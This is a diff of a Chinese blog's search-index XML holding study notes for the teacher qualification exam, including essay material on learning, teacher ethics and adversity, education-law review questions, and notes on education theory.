+<p>【适用论点】①对自己的理想和工作要始终保持一份激情 ②有好的父母（老师）才会有好的启蒙，有好的启蒙孩子才会有好的一生③每个人的心中都有一个“石狮子”，人的一生都在努力将它变为现实，关键是你用什么态度去对待它</p>
+<h3 id="2-知行合一-贵于行之"><a href="#2-知行合一-贵于行之" class="headerlink" title="2.知行合一 贵于行之"></a><strong>2.知行合一 贵于行之</strong></h3><p>齐白石学画虾时，曾终日蹲坐在虾池旁观虾的动态；徐悲鸿的奔马图，是他常在马厩观马的结果；达芬奇为了完成《最后的晚餐》，曾用两年半的时间到酒馆、市集去搜寻人物形象，观摩人物神态。这些名人的事例无不启迪着我们要学有所成，就必须有“知”在肚里，“知”是“行”的前提和基础。</p>
+<p>【适用论点】①单有“知”是不行的，要紧的是“行”，是做 ②学习知识应该用眼、耳、手、脑等多个感官参与学习③实践出真知，唯有“行”了，方可验证所“闻”所“见”</p>
+<h3 id="3-课堂上的观察"><a href="#3-课堂上的观察" class="headerlink" title="3.课堂上的观察"></a><strong>3.课堂上的观察</strong></h3><p>日本茨城大学艺术学博士向野康江曾给上海武宁路小学给三年级学生上了一堂题为“虾5是什么样子的”美术课。课始，孩子们凭自己的既有经验所画的虾并不很理想：有的同学的虾有点像爬虫；有同学的虾头部几乎没画；也有小孩的虾长着“一双大手”，像蟹的钳子。老师并没有急着评价或否定，而是发下真虾，让学生在两相比较中学习观察、思考，从而去发现，并重新作画。这一次，学生的虾画得像样多了，头部也画得细致了，有的学生甚至很好地表现出了虾的肉质感，看上去活灵活现。</p>
+<p>【适用论点】①引导孩子自主自主发现，能极大地激发人的求知欲和创造潜能</p>
+<p>②教育的最终目的是想方设法把人的创造力量诱发出来</p>
+<h2 id="素材三：反面事实论据"><a href="#素材三：反面事实论据" class="headerlink" title="素材三：反面事实论据"></a>素材三：反面事实论据</h2><h3 id="1-“神童”高分低能被退学"><a href="#1-“神童”高分低能被退学" class="headerlink" title="1.“神童”高分低能被退学"></a><strong>1.“神童”高分低能被退学</strong></h3><p>曾名噪一时的“东方神童”魏永康13岁考上重点大学读本科，成为当时湖南省年龄最小的大学生；17岁考上中科院的硕博连读研究生；20岁时，因生活自理能力太差，知识结构不适应中科院的研究模式被退学。在魏永康的成长道路上他的母亲曾学梅可谓“成也萧何败也萧何”。</p>
+<p>【适用论点】①教育应当回归生活 ②高分不一定高能</p>
+<h3 id="2-“考试机器”的前途令人担忧"><a href="#2-“考试机器”的前途令人担忧" class="headerlink" title="2.“考试机器”的前途令人担忧"></a><strong>2.“考试机器”的前途令人担忧</strong></h3><p>北京大学著名教授郑也夫在首期广州教育大讲坛分析了中国教育的现状。他认为“在中国受过12年中小学教育的人，即使进入哈佛耶鲁等世界名校也不会获诺贝尔奖，因为12年的中小学教育把人修理得已没有了想象力和创造力，只是一个考试机器”。一场接一场的考试把孩子们推进“题海”里挣扎，把学习这种智力活动简化为机械的体力劳动，把思维活动退化为机械记忆，把人的大脑当作一个电脑硬盘，惟一的目的就是记住各种“答案”，学会考试。</p>
+<p>【适用论点】①唯分数论可休矣②拒绝考试机器，才能破除“唯分数论”</p>
+]]></content>
+      <categories>
+        <category>教资学习</category>
+      </categories>
+      <tags>
+        <tag>作文素材</tag>
+        <tag>综合素质</tag>
+        <tag>教资考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>作文素材-教师修养</title>
+    <url>/chenyang-tnt/posts/e11ac325/</url>
+    <content><![CDATA[<h1 id="作文素材-教师修养"><a href="#作文素材-教师修养" class="headerlink" title="作文素材-教师修养"></a>作文素材-教师修养</h1><h2 id="素材一：名言警句"><a href="#素材一：名言警句" class="headerlink" title="素材一：名言警句"></a>素材一：名言警句</h2><ol>
+<li><p>我认为努力学习直到生命的最后一刻是美好的事。——卢梭</p>
+</li>
+<li><p>越学习，越发现自己的无知。——笛卡儿</p>
+</li>
+<li><p>黑发不知勤学早，白首方悔读书迟。——朱熹</p>
+</li>
+<li><p>读活书，活读书，读书活。——郭沫若</p>
+</li>
+<li><p>我们再也不能刻苦地一劳永逸地获取知识了，而需要终生学习如何去建立一个不断演进的知识体系：“学会生存”——联合国教科文组织报告《学会生存–教育世界的今天和明天》</p>
+</li>
+</ol>
+<h2 id="素材二：正面事实论据"><a href="#素材二：正面事实论据" class="headerlink" title="素材二：正面事实论据"></a>素材二：正面事实论据</h2><h3 id="1-毛泽东“活到老，学到老”"><a href="#1-毛泽东“活到老，学到老”" class="headerlink" title="1.毛泽东“活到老，学到老”"></a><strong>1.毛泽东“活到老，学到老”</strong></h3><p>“活到老，学到老”，这是毛泽东常说的一句话，也是他一生读书学习的真实写照。他常说：饭可以少吃，觉可以少睡，书不可以不读；读书治学，一是要珍惜时间，二是要勤奋刻苦，除此以外，没有什么窍门和捷径。因此，无论是在戎马倥偬的战争年代，还是新中国成立后的革命和建设时期，为了求知，为了解决中国革命和建设的实际问题，毛泽东孜孜不倦地从大量的书籍中汲取营养。他总是挤时间读书，有时白天实在忙不过来，就减少夜晚的睡眠时间来读书。据他身边的工作人员回忆，毛泽东每天的睡眠时间很少，有时读书就像工作一样，常常是通宵达旦。即使每次外出，毛泽东也总要带些书，或者向当地借些书来读。</p>
+<p>【适用论点】①时间是可以挤出来的②读书，一定要读，要用一生去读③终身</p>
+<p>学习这件事，可能比你想的还要重要</p>
+<h3 id="2-爱因斯坦谈学无止境"><a href="#2-爱因斯坦谈学无止境" class="headerlink" title="2.爱因斯坦谈学无止境"></a><strong>2.爱因斯坦谈学无止境</strong></h3><p>有人问爱因斯坦，说：“您可谓是物理学界空前绝后的人才了，何必还要孜孜不倦地学习？何不舒舒服服地休息呢？”爱因斯坦并没有立即回答他这个问题，而是找来一支笔、一张纸，在纸上画上一个大圆和一个小圆，说：“目前情况下，在物理学这个领域里可能是我比你懂得略多一些。正如你所知的是这个小圆，我所知的是这个大圆。然而整个物理学识是无边无际的，对于小圆，它的周长小，即与未知领域的接触面小，他感受到自己的未知少；面大圆与外界接触的这一周长大，所以更感到自己的未知东西多，会更加努力去探索。</p>
+<p>【适用论点】①学伴终生，学无止境②笃学善思，才能百尺竿头③高度决定视野，角度改变观念</p>
+<h3 id="3-读书——生活的方式"><a href="#3-读书——生活的方式" class="headerlink" title="3.读书——生活的方式"></a><strong>3.读书——生活的方式</strong></h3><p>苏霍姆林斯基有一笔“财富”：“我私人的图书馆里，在几间房子和走廊里，从地板直到天花板都摆上了书架……有成千上万册图书……我每天不读上几页，有时不读上几行，我是无法活下去的……而一所学校可能什么都齐全，但如果没有为了人的全面发展和丰富精神生活而必备的书，或者如果大家不喜爱书籍，对书籍冷淡，那么，就不能称其为学校。一所学校也可能缺少很多东西，可能在许多方面都很简陋贫乏，但只要有书，有能为我们经常敞开世界之窗的书，那么，这就足以称得上是学校了。”</p>
+<p>【适用论点】①真正的教师一定是读书的爱好者②对一个教师而言，读书就是最好的备课③集体的智力财富之源首先在于教师的个人阅读④书籍是学校中的学校；学校应当成为书籍的王国</p>
+<h2 id="素材三：反面事实论据"><a href="#素材三：反面事实论据" class="headerlink" title="素材三：反面事实论据"></a>素材三：反面事实论据</h2><h3 id="1-江郎“才”尽"><a href="#1-江郎“才”尽" class="headerlink" title="1.江郎“才”尽"></a><strong>1.江郎“才”尽</strong></h3><p>南朝的江淹，年轻的时候，就成为一个鼎鼎有名的文学家，他的诗和文章在当时获得极高的评价。可是，当他年纪渐渐大了以后，他的文章不但没有以前写得好了，而且退步不少。他的诗写出来平淡无奇，而且提笔吟握好久，依旧写不出一个字来；偶尔灵感来了，诗写出来了，但文句枯涩，内容平淡得一无可取。其实并不是江淹的才华已经用完了，而是他当官以后，一方面由于政务繁忙，另一方面也由于仕途得意，无需自己动笔，劳心费力，就不再动笔了。久而久之，文章自然会逐渐逊色，缺乏才气。</p>
+<p>【适用论点】①人的智慧不用就会枯萎②成功来自勤奋③凡事勤则易，凡事惰则难。</p>
+<h3 id="2-仲永之殇"><a href="#2-仲永之殇" class="headerlink" title="2.仲永之殇"></a><strong>2.仲永之殇</strong></h3><p>方仲永、在他很小的时候，就显示出了在诗歌方面的才华，被人们赞誉为神童。那些有钱人家经常邀请方仲永到自己家来，一方面是为了目睹一下这位神童的才华，另一方面也是显示一下自己爱惜人才。当然，每当方仲永走的时候，那些有钱人家都会给一些钱以表心意。方仲永的父亲是一个十分爱钱的人，他把方仲永当成了一棵摇钱树。当没有人邀请的时候，他就领着方仲永主动登门拜访，以求得人家给点小钱。由于整天跟着父亲东家进西家出，方仲永的学业荒废了，他在诗歌方面的才华，由于没有选择一个正确的方式加以培养，也渐渐地枯萎了。方仲永长大后，人们从他身上再也看不见一点当初神童的影子。</p>
+<p>【适用论点】①天才出于勤奋②才能来自于勤奋学习</p>
+]]></content>
+      <categories>
+        <category>教资学习</category>
+      </categories>
+      <tags>
+        <tag>作文素材</tag>
+        <tag>综合素质</tag>
+        <tag>教资考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>作文素材-逆境类</title>
+    <url>/chenyang-tnt/posts/4e8c38c2/</url>
+    <content><![CDATA[<h3 id="1-在苦难中升华自己的生命价值-史铁生"><a href="#1-在苦难中升华自己的生命价值-史铁生" class="headerlink" title="1.在苦难中升华自己的生命价值 史铁生"></a><strong>1.在苦难中升华自己的生命价值 史铁生</strong></h3><p>命运许多时候是不公平的，史铁生因故双腿瘫痪，后来又患肾病并发展到尿毒症，靠着每周3次透析维持生命。他摇着轮椅，徘徊在荒芜的地坛。他想到过去，想到现实，想到母亲，想到生命，想到欲望……挣扎、求存和奋斗战胜了绝望、懦弱和苟且。最终，他用手中的笔，写出自己的感受和生活，对“什么是生命”“为什么要活着”“怎样活着”等问题做出了哲学的思考和回答，用残缺的人生写出了最智慧的文字，成为我们心中的一盏明灯。他后历任中国作家协会全国委员会委员，北京作家协会副主席，中国残疾人联合会副主席。</p>
+<h3 id="2-身处逆境，豁达洒脱-苏轼"><a href="#2-身处逆境，豁达洒脱-苏轼" class="headerlink" title="2.身处逆境，豁达洒脱 苏轼"></a><strong>2.身处逆境，豁达洒脱 苏轼</strong></h3><p>谪居黄州期间，凄风苦雨中的苏轼泛舟赤壁，在清风、明月之中，超越了失意和悲伤，参悟了水与月的辩证法，捕捉到“自其变者而观之，则天地曾不能以一瞬；自其不变者而观之，则物与我皆无尽也”的生命本真，最终彻底顿悟了生命的真谛。跳出心灵炼狱的苏轼开始尽情享受“清风”“明月”……苏轼不因遭受政治迫害而委靡消沉，而是寄豪情于山水，荡胸臆于自然。身处逆境而豁达洒脱，随缘自适，从人生无常的怅惘中解脫出来，理性地对待生活。面对生活中的坎坷，我们也要乐观驱散阴霾，用旷达解读挫折，永远保持理智与乐观。</p>
+<h3 id="3-能屈能伸是俊杰，卧薪尝胆的-勾践"><a href="#3-能屈能伸是俊杰，卧薪尝胆的-勾践" class="headerlink" title="3.能屈能伸是俊杰，卧薪尝胆的 勾践"></a><strong>3.能屈能伸是俊杰，卧薪尝胆的 勾践</strong></h3><p>越国兵败吴国于公元前494年。越王勾践只好“审辞厚礼”向吴求和，等待东山再起。勾践先用美女、金银珠宝贿赂吴王和众臣，还用妻子作人质，自己为吴王当马夫。勾践还为吴王送茶送饭，端屎端尿，终于赢得了吴王信任，得以被释放。勾践死里逃生回国后，卧薪尝胆，一面继续进贡吴国，一面聚兵训练。最后他率精兵数万，彻底打败了吴国，实现了洗辱复国的志愿。</p>
+]]></content>
+      <categories>
+        <category>教资学习</category>
+      </categories>
+      <tags>
+        <tag>作文素材</tag>
+        <tag>综合素质</tag>
+        <tag>教资考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>作文素材-道德风尚</title>
+    <url>/chenyang-tnt/posts/5523b363/</url>
+    <content><![CDATA[<h1 id="作文素材-道德风尚"><a href="#作文素材-道德风尚" class="headerlink" title="作文素材-道德风尚"></a>作文素材-道德风尚</h1><h2 id="素材一：名言警句"><a href="#素材一：名言警句" class="headerlink" title="素材一：名言警句"></a>素材一：名言警句</h2><ol>
+<li><p>道德普遍地被认为是人类的最高目的，因此也是教育的最高目的。——赫尔巴特</p>
+</li>
+<li><p>教师真正的教养性表现为：学生能从他身上看到一个引导他们攀登道德高峰的引路人，从他的话里听出他在号召他们成为忠于信念，对邪念不妥协的人。——苏霍姆林斯基</p>
+</li>
+<li><p>世上最奇妙的是我头上灿烂星空和内心的道德准则。——康德</p>
+</li>
+<li><p>道德是做人的根本。根本一坏，纵然使你有一些学问和本领，也无甚用处。——陶行知</p>
+</li>
+</ol>
+<h2 id="素材二：正面事实论据"><a href="#素材二：正面事实论据" class="headerlink" title="素材二：正面事实论据"></a>素材二：正面事实论据</h2><h3 id="1-用生命诠释师德的谭千秋"><a href="#1-用生命诠释师德的谭千秋" class="headerlink" title="1.用生命诠释师德的谭千秋"></a><strong>1.用生命诠释师德的谭千秋</strong></h3><p>2008年5月12日，四川汶川发生强烈地震，波及绵竹。在地震中，东汽中学一栋教学楼顷刻坍塌。当时，谭千秋正在这栋教学楼的教室里上课，他迅速组织同学们向楼下疏散。当他得知有几个同学还没有离开，立即从三楼返回四楼。看到水泥天花板即将坠落，危急时刻他奋不顾身扑了上去，用双臂将4名高二一班的学生紧紧地掩护在身下。5月13日晚上，当人们从废墟中将他的遗体扒出来时，他的双臂还是张开的，趴在讲台上。手臂上伤痕累累，脑袋后部被楼板砸得凹了下去。4名学生在他的保护下成功获救，可是他就这样献出了自己宝贵的生命。</p>
+<p>【适用论点】师德无边爱心无限</p>
+<h3 id="2-最美教师张丽莉"><a href="#2-最美教师张丽莉" class="headerlink" title="2.最美教师张丽莉"></a><strong>2.最美教师张丽莉</strong></h3><p>黑龙江佳木斯女教师张丽莉牵动着全国人民的心。29岁的她在失控客车冲向学生时，奋力将学生推开，自己却被卷入车下，致双腿高位截肢、全身多处骨折，至今未脱离生命危险。生死关头以柔弱之躯保护学生，彰显了伟大、无私的师德，危急时刻舍己救人，离不开高尚的情操。对于这样的英雄，人们从不吝啬赞美之词，“英雄教师”“最勇敢”、“最美丽”、“最有人性光辉”似乎都不足以表达对她的敬意。</p>
+<p>【适用论点】用行动诠释师德</p>
+<h3 id="3-最合格的助手"><a href="#3-最合格的助手" class="headerlink" title="3.最合格的助手"></a><strong>3.最合格的助手</strong></h3><p>医院病房里，一名护士正在帮助一名著名的外科大夫给病人缝合伤口，护士突然说：“不行，还有一块纱布没取出来，一共是 l2 块纱布，现在只取出了11块。”大夫说：“我取出来了，缝伤口。”护士坚持不让。过了一会儿，大夫伸出手说：“我要的护士就是这样的！”原来另一块纱布在他的掌心里。</p>
+<p>【适用论点】①正直，是真正的人格②任何职业都需要高度负责的精神</p>
+<h2 id="素材三：反面事实论据"><a href="#素材三：反面事实论据" class="headerlink" title="素材三：反面事实论据"></a>素材三：反面事实论据</h2><h3 id="1-社会公德意识缺失，严重拉低中国“尊敬指数”"><a href="#1-社会公德意识缺失，严重拉低中国“尊敬指数”" class="headerlink" title="1.社会公德意识缺失，严重拉低中国“尊敬指数”"></a><strong>1.社会公德意识缺失，严重拉低中国“尊敬指数”</strong></h3><p>在我们身边的现实，尤其在公共场所，社会公德缺乏的现象比比皆是，以至于近些年来，诸如“中国式过马路”、“中国式排队”、“中国式抢购”、“中国式喧哗”等热词通过网络以及各种媒体大肆传播。“中国式”似乎成了“中国病”、“中国问题”的代名词，给中国形象抹黑。在国外，部分国人违背社会公德的行为更是带来严重的不良影响，诸如：中国中学生在埃及神庙涂鸦破坏文物、中国游客巴黎罗浮宫喷泉洗脚、中国大妈美国跳广场舞被抓等等。规则意识的淡薄造成社会公德意识的缺失，让中国游客在很多外国人眼中成了“坏孩子”和“不受欢迎的人”。</p>
+<p>【适用论点】①全面提升社会公德意识②德育贯穿学校教育全过程</p>
+<h3 id="2-“教师虐童”事件背后的师德乱象"><a href="#2-“教师虐童”事件背后的师德乱象" class="headerlink" title="2.“教师虐童”事件背后的师德乱象"></a><strong>2.“教师虐童”事件背后的师德乱象</strong></h3><p>蓝孔雀幼儿园颜老师因为好玩就把男童的两只耳朵拎着往上提，并叫同事拍摄；孩子不听话就用透明胶封住嘴巴。还有其他幼儿园的老师因为不会做算术题，5岁女童被老师狂扇70记耳光；因为不认真做操老师狂摔孩子造成孩子偏瘫……近期频频曝光的幼儿园虐童事件，深深刺痛着广大家长的心，对孩子造成的影响却是抹不去的阴影。</p>
+<p>【适用论点】破解“虐童”问题须加强教师道德建设</p>
+]]></content>
+      <categories>
+        <category>教资学习</category>
+      </categories>
+      <tags>
+        <tag>作文素材</tag>
+        <tag>综合素质</tag>
+        <tag>教资考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>教育法规-期末复习</title>
+    <url>/chenyang-tnt/posts/d03beb59/</url>
+    <content><![CDATA[<h1 id="教育法规"><a href="#教育法规" class="headerlink" title="教育法规"></a>教育法规</h1><h2 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a>一、填空题</h2><ol>
+<li><p><strong>教师公正</strong>是指教师在教育和教学过程中，公平合理地对待和评价每一位学生</p>
+</li>
+<li><p>道德的功能有<strong>认识功能、教育功能和调节功能</strong></p>
+</li>
+<li><p>师德的灵魂是<strong>关爱学生</strong></p>
+</li>
+<li><p><strong>终身学习</strong>是教师专业发展的不竭动力</p>
+</li>
+<li><p>教师职业道德评价是对教师的职业<strong>道德意识、道德情感、道德意志、道德行为</strong>进行的考察和价值判断</p>
+</li>
+<li><p>教师职业道德评价的监督激励功能是<strong>分等鉴定</strong>功能的必然结果</p>
+</li>
+<li><p>教师职业道德修养是<strong>自我锻炼、自我改造、自我陶冶、自我教育</strong>的过程。</p>
+</li>
+<li><p><strong>教师公正</strong>是指教师在教育和教学过程中，公平合理地对待和评价每一个学生。</p>
+</li>
+<li><p>师德的灵魂是<strong>关爱学生</strong></p>
+</li>
+<li><p>教师职业道德评价是对教师的职业<strong>道德意识、道德情感、道德意志、道德行为</strong>和进行的考察和价值判断</p>
+</li>
+<li><p>教师职业道德修养是<strong>自我锻炼、自我陶冶、自我改造、自我教育</strong>的过程。</p>
+</li>
+<li><p><strong>教育法</strong>是调整各级各类教育的关系的法律规范的总称。</p>
+</li>
+<li><p>教育法规定国家保护教师的合法权益，改善教师的工作条件和生活条件、<strong>提高教师的社会地位</strong></p>
+</li>
+<li><p>教师主要通过<strong>教职工代表大会</strong>形式参与学校的民主管理。</p>
+</li>
+<li><p><strong>依法治校</strong>是依法治教的要求，也是落实学校办学自主权、提高管理效率、保护有关法律关系主体合法权益的需求。</p>
+</li>
+<li><p>教师的平均工资水平应当<strong>不低于或者高于</strong>国家公务员的平均工资水平，并逐步提高</p>
+</li>
+<li><p>中国公民在各级各类学校和其他教育机构中专门从事教育教学工作，应当依法取得<strong>教师资格证</strong></p>
+</li>
+<li><p>《教师法》规定，教师是履行教育教学职责的<strong>专业人员</strong></p>
+</li>
+<li><p>学校依法对学生的人身安全承担<strong>教育、管理、保护</strong>责任</p>
+</li>
+<li><p><strong>《教师法》</strong>明确规定实行教师资格制度、教师职务制度和教师聘任制度，从而奠定了教师任用与管理的新机制，构成了教师管理法律制度的核心</p>
+</li>
+<li><p>在我国，教师节是每年的<strong>9月10日</strong></p>
+</li>
+<li><p>义务教育是国家统一实施的所有适龄儿童、少年必须接受的教育，是国家必须予以保障的<strong>公益性事业</strong></p>
+</li>
+<li><p>实施义务教育，不收<strong>学杂费</strong>国家建立义务教育经费保障机制，保证义务教育制度实施</p>
+</li>
+<li><p>义务教育必须贯彻国家的教育方针，实施素质教育，提高教育质量，使适龄儿童、少年在品德、智力、体质等方面全面发展，为培养<strong>有理想、有道德、有文化、有纪律</strong>的社会主义建设者和接班人奠定基础</p>
+</li>
+<li><p>人民政府教育督导机构对义务教育工作执行法律法规情况、教育教学质量以及义务教育均衡发展状况等进行督导，督导报告向<strong>社会</strong>公布。</p>
+</li>
+<li><p>凡年满<strong>6周岁</strong>的儿童，其父母或者其他法定监护人应当送其入学接受并完成义务教育；条件不具备的地区的儿童，可以推迟到<strong>7周岁</strong>。适龄儿童、少年因身体状况需要延缓入学或者休学的，法定监护人应当提出申请，由当地人民政府或者<strong>人民政府教育行政部门</strong>批准。</p>
+</li>
+<li><p>适龄儿童、少年<strong>免试</strong>入学。地方各级人民政府应当保障适龄儿童、少年在户籍所在地学校<strong>就近</strong>入学。</p>
+</li>
+<li><p>县级人民政府教育行政部门和乡镇人民政府组织和督促适龄儿童、少年入学，帮助解决适龄儿童、少年接受义务教育的困难，采取措施防止适龄儿童、少年<strong>辍学</strong></p>
+</li>
+<li><p>学校建设，应当符合国家规定的办学标准，适应教育教学需要；应当符合国家规定的选址要求和建设标准，确保<strong>学生和教职工安全</strong></p>
+</li>
+<li><p>县级以上地方人民政府根据需要设置相应的实施<strong>特殊教育</strong>的学校（班），对视力残疾、听力语言残疾和智力残疾的适龄儿童、少年实施义务教育。</p>
+</li>
+<li><p>对未完成义务教育的未成年犯和被采取强制性教育措施的未成年人应当进行义务教育，所需经费由<strong>人民政府</strong>予以保障。</p>
+</li>
+<li><p>国家鼓励高等学校毕业生以<strong>志愿者</strong>的方式到农村地区、民族地区缺乏教师的学校任教。县级人民政府教育行政部门依法认定其教师资格，其任教时间计入工龄。</p>
+</li>
+<li><p>教育教学工作应当符合<strong>教育规律</strong>和学生身心发展特点，面向全体学生，教书育人，将德育、智育、体育、美育等有机统一在教育教学活动中，注重培养学生独立思考能力、创新能力和实践能力，促进学生全面发展</p>
+</li>
+<li><p>国务院教育行政部门根据适龄儿童、少年身心发展的状况和实际情况，确定教学制度、教育教学内容和课程设置，改革考试制度，并改进高级中等学校招生办法，推进实施<strong>素质教育</strong></p>
+</li>
+<li><p>学校应当把<strong>德育</strong>放在首位，寓德育于教育教学之中，开展与学生年龄相适应的社会实践活动，形成学校、家庭、社会相互配合的思想道德教育体系，促进学生养成良好的思想品德和行为习惯</p>
+</li>
+<li><p>对接受义务教育的适龄儿童、少年不收杂费的实施步骤，由<strong>国务院</strong>规定。</p>
+</li>
+</ol>
+<h2 id="二、我觉得比较重要的一些点"><a href="#二、我觉得比较重要的一些点" class="headerlink" title="二、我觉得比较重要的一些点"></a>二、我觉得比较重要的一些点</h2>]]></content>
+      <categories>
+        <category>综合学习</category>
+      </categories>
+      <tags>
+        <tag>综合素质</tag>
+        <tag>临时抱拂脚</tag>
+        <tag>期末复习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>教育知识与能力-教育基础知识</title>
     <url>/chenyang-tnt/posts/b82c27fd/</url>
     <content><![CDATA[<h2 id="一、教育的产生与发展"><a href="#一、教育的产生与发展" class="headerlink" title="一、教育的产生与发展"></a>一、教育的产生与发展</h2><h3 id="1-教育的概念"><a href="#1-教育的概念" class="headerlink" title="1.教育的概念"></a>1.教育的概念</h3><h4 id="（1）“教育”一词最早出现在《孟子-尽心上学》。"><a href="#（1）“教育”一词最早出现在《孟子-尽心上学》。" class="headerlink" title="（1）“教育”一词最早出现在《孟子-尽心上学》。"></a>（1）“教育”一词最早出现在《孟子-尽心上学》。</h4><h4 id="（2）教育的定义："><a href="#（2）教育的定义：" class="headerlink" title="（2）教育的定义："></a>（2）教育的定义：</h4><ol>
@@ -76,160 +411,12 @@
 <hr>
 <h2 id="二、教育学的产生与发展"><a href="#二、教育学的产生与发展" class="headerlink" title="二、教育学的产生与发展"></a>二、教育学的产生与发展</h2><h2 id="三、教育与社会发展"><a href="#三、教育与社会发展" class="headerlink" title="三、教育与社会发展"></a>三、教育与社会发展</h2><h2 id="四、教育与人的发展"><a href="#四、教育与人的发展" class="headerlink" title="四、教育与人的发展"></a>四、教育与人的发展</h2><h2 id="五、教育制度"><a href="#五、教育制度" class="headerlink" title="五、教育制度"></a>五、教育制度</h2><h2 id="六、教育研究方法"><a href="#六、教育研究方法" class="headerlink" title="六、教育研究方法"></a>六、教育研究方法</h2>]]></content>
       <categories>
-        <category>教资考试</category>
+        <category>教资学习</category>
       </categories>
       <tags>
         <tag>教资考试</tag>
         <tag>教育知识与能力</tag>
         <tag>教育基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>综合素质-职业观念</title>
-    <url>/chenyang-tnt/posts/4d4b3e5e/</url>
-    <content><![CDATA[<h2 id="教育观"><a href="#教育观" class="headerlink" title="教育观"></a>教育观</h2><h3 id="一-素质教育的基本内涵-口诀-提速个性创两全"><a href="#一-素质教育的基本内涵-口诀-提速个性创两全" class="headerlink" title="一.素质教育的基本内涵(口诀:提速个性创两全)"></a>一.素质教育的基本内涵(口诀:提速个性创两全)</h3><ul>
-<li>素质教育是以提高<font color=blue><strong>国民素质</strong></font>为根本宗旨</li>
-<li>素质教育是面向<font color=blue><strong>全体学生</strong></font>的教育</li>
-<li>素质教育是促进学生<font color=blue><strong>全面发展</strong></font>的教育</li>
-<li>素质教育是促进学生<font color=blue><strong>个性发展</strong></font>的教育</li>
-<li>素质教育是以培养学生的<font color=blue><strong>创新精神</strong></font>和<font color=blue><strong>实践能力</strong></font>为重点的教育</li>
-</ul>
-<h3 id="二-新课标改革的教学观-口诀-学习过人"><a href="#二-新课标改革的教学观-口诀-学习过人" class="headerlink" title="二.新课标改革的教学观(口诀:学习过人)"></a>二.新课标改革的教学观(口诀:学习过人)</h3><ul>
-<li>教学从”<strong>教育者为中心</strong>“转向”<strong>学习者为中心</strong>“</li>
-<li>教学从”<strong>教会学生知识</strong>“转向”<strong>教会学生学习</strong>“</li>
-<li>教学从”<strong>重结论轻过程</strong>“<strong>转向”重结论更重过程</strong>“</li>
-<li>教学从”<strong>关注学科</strong>“转向”<strong>关注人</strong>“</li>
-</ul>
-<h3 id="三-素质教育与应试教育的区别"><a href="#三-素质教育与应试教育的区别" class="headerlink" title="三.素质教育与应试教育的区别"></a>三.素质教育与应试教育的区别</h3><table>
-<thead>
-<tr>
-<th align="center">类别</th>
-<th align="center">素质教育</th>
-<th align="center">应试教育</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">教学方法</td>
-<td align="center">启发式、探究式教学，使学生生动、活泼主动地学习，减轻学生课业负担</td>
-<td align="center">以死记硬背和机械重复训练为主，使学生课业负担过重</td>
-</tr>
-<tr>
-<td align="center">学生评价</td>
-<td align="center">发展性评价，评价方式多元，评价主体多元</td>
-<td align="center">筛选性评价，以考试成绩作为评价学习的主要标准甚至唯一标准</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="学生观"><a href="#学生观" class="headerlink" title="学生观"></a>学生观</h2><h3 id="一-”以人为本”的学生观"><a href="#一-”以人为本”的学生观" class="headerlink" title="一.”以人为本”的学生观"></a>一.”以人为本”的学生观</h3><ul>
-<li><p>学生是具有独立意义的主体,是不以教师意志为转移的客观存在。</p>
-<ol>
-<li>每个学生都是独立与教师头脑之外的，不以教师的意志为转移的客观存在</li>
-<li>学生是学习的主体</li>
-<li>学生是责权的主体</li>
-</ol>
-</li>
-<li><p>学生是独特的人，具有自身的独特性。</p>
-<ol>
-<li>学生是完整的人（要把学生当作完整的人来对待，给予学生全面展现个性力量的时间和空间）</li>
-<li>每个学生都有自身的独特性（关键字：因材施教）</li>
-<li>学生与成人之间存在巨大的差异（要做到换位思考）</li>
-</ol>
-</li>
-<li><p>学生是发展的人，具有巨大的发展潜能。</p>
-<ol>
-<li>学生的身心发展是有规律的（教育活动要依据学生的身心发展来开展）</li>
-<li>学生具有巨大的发展潜能</li>
-<li>学生是处于发展过程中的人（我们要理解学生存在的不足，理解学生犯的错误）</li>
-</ol>
-</li>
-</ul>
-<h3 id="二-个体身心发展的一般规律"><a href="#二-个体身心发展的一般规律" class="headerlink" title="二.个体身心发展的一般规律"></a>二.个体身心发展的一般规律</h3><ul>
-<li>个体身心发展具有顺序性</li>
-<li>个体身心发展的阶段性</li>
-<li>个体身心发展的不平衡性</li>
-<li>个体身心发展的互补性</li>
-<li>个体身心发展的个别差异性</li>
-</ul>
-<hr>
-<h2 id="教师观"><a href="#教师观" class="headerlink" title="教师观"></a>教师观</h2><h3 id="一-现代教师角色转换-口诀-见醋放盐"><a href="#一-现代教师角色转换-口诀-见醋放盐" class="headerlink" title="一.现代教师角色转换(口诀:见醋放盐)"></a>一.现代教师角色转换(口诀:见醋放盐)</h3><ul>
-<li>教师是学生学习的引导者和学生发展的促进者</li>
-<li>教师是课程的建设者和开发者</li>
-<li>教师是教育教学的研究者和反思的实践者</li>
-<li>教师是社区型的开放的教师</li>
-</ul>
-<h3 id="二-教师职业特点"><a href="#二-教师职业特点" class="headerlink" title="二.教师职业特点"></a>二.教师职业特点</h3><ul>
-<li><p>复杂性</p>
-<ol>
-<li>教育目的的全面性:[关键词: 目的是培养德智体美劳全面发展而非单一发展的人]</li>
-<li>教育任务的多样性:[关键词:不仅教书还要育人，不仅教知识、发展智力还要培养思想道德保证身心健康]</li>
-</ol>
-</li>
-<li><p>创造性</p>
-<ol>
-<li>因材施教，[关键词:一把钥匙开一把锁，扬长避短、长善救失];</li>
-<li>教学方法上不断更新:[关键词: 教学需要随时代随科技不断变化];</li>
-<li>教师需要教育机智。[关键词: 随机应变、应对突发状况]</li>
-</ol>
-</li>
-<li><p>主体性和示范性</p>
-<ol>
-<li>主体性:[关键词:言传身教];</li>
-<li>示范性:言行举止都会言行学生的发展.</li>
-</ol>
-</li>
-<li><p>劳动时间的延续性和劳动空间的广延性</p>
-<ol>
-<li>劳动时间的延续性[关键词:从早忙到晚];</li>
-<li>劳动空间的广延性[关键词:从校内到校外].</li>
-</ol>
-</li>
-<li><p>长期性和间接性</p>
-<ol>
-<li>长期性:[关键例子:十年树木百年树人];</li>
-<li>间接性:[;关键词:教师的劳动通过学生的成就实现].</li>
-</ol>
-</li>
-</ul>
